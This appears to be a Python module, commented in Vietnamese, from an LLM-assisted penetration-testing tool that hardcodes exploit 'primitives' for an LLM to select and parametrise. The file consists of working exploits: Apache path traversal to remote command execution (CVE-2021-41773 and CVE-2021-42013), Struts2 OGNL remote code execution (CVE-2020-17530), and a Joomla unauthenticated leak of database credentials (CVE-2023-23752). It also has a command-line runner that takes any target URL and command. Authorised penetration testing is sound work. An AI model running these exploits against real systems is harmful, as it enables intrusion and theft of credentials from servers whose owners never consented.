"""Hardcode exploit primitives — THAM KHẢO PentestCode `inject-probe.ts`.

Mẫu: **LLM chỉ chọn primitive + điền param**, code làm phần khó + **oracle TẤT ĐỊNH** (nonce ngẫu
nhiên do CHÍNH ta echo trong lệnh → có trong response = server ĐÃ chạy lệnh; cộng indicator `uid=`).
Không phụ thuộc LLM đánh giá, không cần module pocsuite. Dùng cho phương pháp D như **lane nhanh/tất
định** (thử primitive trước; strong → success ngay; none → fallback pocsuite `:5568`).

Air-gap: chỉ stdlib (`http.client`), gửi path **nguyên văn** (path-as-is) — bắt buộc cho path-traversal
(`%2e` KHÔNG được normalize). Mỗi primitive trả `PrimitiveResult` (verdict + lead_quality + evidence).
"""
from __future__ import annotations

import http.client
import json
import random
import re
import string
from dataclasses import dataclass
from typing import Callable
from urllib.parse import quote, urlparse

_NONCE_PREFIX = "pz"
_UID_RE = re.compile(r"uid=\d+\(")           # CMDI indicator (mẫu inject-probe CMDI_INDICATORS)
_PASSWD_RE = re.compile(r"root:.*:0:0:")     # LFI indicator (mẫu inject-probe LFI_INDICATORS)


def _nonce() -> str:
    return _NONCE_PREFIX + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


@dataclass
class PrimitiveResult:
    verdict: str                 # exploit_success | exploit_failed | inconclusive
    lead: str                    # strong | weak | none
    evidence: str
    output: str = ""
    primitive: str = ""

    @property
    def ok(self) -> bool:
        return self.verdict == "exploit_success"


def _split(base_url: str) -> tuple[str, int, bool]:
    u = urlparse(base_url if "://" in base_url else "http://" + base_url)
    tls = u.scheme == "https"
    return (u.hostname or base_url), (u.port or (443 if tls else 80)), tls


def _raw_http(host: str, port: int, method: str, path: str, *, headers: dict[str, str] | None = None,
              body: str | None = None, timeout: float = 15.0, tls: bool = False) -> tuple[int, str]:
    """http.client raw — GỬI PATH NGUYÊN VĂN (không normalize `%2e`/`%%32%65`). Trả (status, body)."""
    cls = http.client.HTTPSConnection if tls else http.client.HTTPConnection
    conn = cls(host, port, timeout=timeout)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        r = conn.getresponse()
        return r.status, r.read().decode("utf-8", "replace")
    finally:
        conn.close()


# ─────────────────────────── Primitives ───────────────────────────

def apache_path_traversal_rce(base_url: str, command: str = "id", *, double: bool = False) -> PrimitiveResult:
    """CVE-2021-41773 (Apache 2.4.49, single `.%2e`) / CVE-2021-42013 (2.4.50, double `.%%32%65`).
    POST tới `/cgi-bin/<seg>/.../bin/sh`; body = CGI script chạy lệnh. Oracle: nonce (ta tự echo) +
    `uid=` trong response."""
    name = "apache_path_traversal_rce"
    host, port, tls = _split(base_url)
    n = _nonce()
    seg = ".%%32%65" if double else ".%2e"          # '.' mã hoá (double cho 2.4.50)
    path = "/cgi-bin/" + "/".join([seg] * 4) + "/bin/sh"
    body = f"echo Content-Type: text/plain; echo; echo {n}; {command}"
    hdr = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        st, resp = _raw_http(host, port, "POST", path, headers=hdr, body=body, tls=tls)
    except Exception as exc:
        return PrimitiveResult("inconclusive", "none", f"request lỗi: {exc}", primitive=name)
    if n in resp:                                    # server ĐÃ chạy `echo <nonce>` → RCE tất định
        out = resp.split(n, 1)[-1].strip()[:600]
        uid = bool(_UID_RE.search(resp))
        return PrimitiveResult("exploit_success", "strong",
                               f"nonce {n} reflected → RCE (uid_indicator={uid})", output=out, primitive=name)
    return PrimitiveResult("exploit_failed", "none", f"no nonce echo (status {st})", primitive=name)


def struts2_ognl_rce(base_url: str, command: str = "id") -> PrimitiveResult:
    """CVE-2020-17530 Struts2 S2-061 — forced double-OGNL eval. POST `/index.action` field `id=<OGNL>`.
    freemarker `Execute.exec` chạy command qua `Runtime.exec` (KHÔNG shell → không chèn được nonce
    kiểu `sh -c`); output tự phản chiếu vào response (double eval). Oracle: `uid=` reflected — tất
    định (payload gửi đi KHÔNG chứa `uid=`)."""
    name = "struts2_ognl_rce"
    host, port, tls = _split(base_url)
    cmd = command.replace("'", "").replace("\\", "")     # tránh vỡ OGNL literal
    ognl = ("%{(#im=#application['org.apache.tomcat.InstanceManager'])."
            "(#stack=#attr['com.opensymphony.xwork2.util.ValueStack.ValueStack'])."
            "(#bean=#im.newInstance('org.apache.commons.collections.BeanMap'))."
            "(#bean.setBean(#stack)).(#context=#bean.get('context')).(#bean.setBean(#context))."
            "(#macc=#bean.get('memberAccess')).(#bean.setBean(#macc))."
            "(#es=#im.newInstance('java.util.HashSet'))."
            "(#bean.put('excludedClasses',#es)).(#bean.put('excludedPackageNames',#es))."
            "(#al=#im.newInstance('java.util.ArrayList')).(#al.add('" + cmd + "'))."
            "(#ex=#im.newInstance('freemarker.template.utility.Execute')).(#ex.exec(#al))}")
    body = "id=" + quote(ognl, safe="")
    hdr = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        st, resp = _raw_http(host, port, "POST", "/index.action", headers=hdr, body=body, tls=tls)
    except Exception as exc:
        return PrimitiveResult("inconclusive", "none", f"request lỗi: {exc}", primitive=name)
    m = re.search(r"uid=\d+\([^\n<]{0,120}", resp)       # payload không chứa 'uid=' → match = RCE thật
    if m:
        return PrimitiveResult("exploit_success", "strong",
                               f"Execute.exec RCE (S2-061): {m.group(0)}", output=m.group(0), primitive=name)
    return PrimitiveResult("exploit_failed", "none", f"no uid indicator (status {st})", primitive=name)


def joomla_config_leak(base_url: str, command: str | None = None) -> PrimitiveResult:
    """CVE-2023-23752 Joomla — unauth webservice config leak. GET config API; oracle: field
    `password` lộ giá trị non-empty (differential: endpoint public KHÔNG được lộ db creds)."""
    name = "joomla_config_leak"
    host, port, tls = _split(base_url)
    path = "/api/index.php/v1/config/application?public=true"
    try:
        # Joomla API từ chối Accept:application/json (406); chỉ nhận */* — đúng chuẩn mọi Joomla.
        st, resp = _raw_http(host, port, "GET", path, headers={"Accept": "*/*"}, tls=tls)
    except Exception as exc:
        return PrimitiveResult("inconclusive", "none", f"request lỗi: {exc}", primitive=name)
    try:
        json.loads(resp)                              # phải là JSON hợp lệ
    except Exception:
        return PrimitiveResult("exploit_failed", "none", f"không phải JSON (status {st})", primitive=name)
    m = re.search(r'"password"\s*:\s*"([^"]+)"', resp)
    if m and m.group(1).strip():
        user = re.search(r'"user"\s*:\s*"([^"]*)"', resp)
        ev = f"db creds lộ unauth: user={user.group(1) if user else '?'} password={m.group(1)[:24]}…"
        return PrimitiveResult("exploit_success", "strong", ev, output=resp[:600], primitive=name)
    return PrimitiveResult("exploit_failed", "none", f"không lộ password (status {st})", primitive=name)


# ─────────────────────────── Dispatcher ───────────────────────────

_REGISTRY: dict[str, Callable[[str, str], PrimitiveResult]] = {
    "CVE-2021-41773": lambda u, c: apache_path_traversal_rce(u, c, double=False),
    "CVE-2021-42013": lambda u, c: apache_path_traversal_rce(u, c, double=True),
    "CVE-2020-17530": struts2_ognl_rce,
    "CVE-2023-23752": joomla_config_leak,
}


def has_primitive(cve: str) -> bool:
    return (cve or "").strip().upper() in _REGISTRY


def run_primitive(cve: str, base_url: str, command: str = "id") -> PrimitiveResult | None:
    """Chạy primitive cho CVE nếu có; None nếu chưa hỗ trợ (caller fallback pocsuite)."""
    fn = _REGISTRY.get((cve or "").strip().upper())
    return fn(base_url, command) if fn else None


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("usage: python primitives.py <CVE> <base_url> [command]")
        raise SystemExit(2)
    cve, url = sys.argv[1], sys.argv[2]
    cmd = sys.argv[3] if len(sys.argv) > 3 else "id"
    res = run_primitive(cve, url, cmd)
    if res is None:
        print(f"[no primitive] {cve}")
        raise SystemExit(3)
    print(f"[{res.verdict}] lead={res.lead} primitive={res.primitive}\n  evidence: {res.evidence}")
    if res.output:
        print("  output:", res.output[:300].replace("\n", " / "))
    raise SystemExit(0 if res.ok else 1)
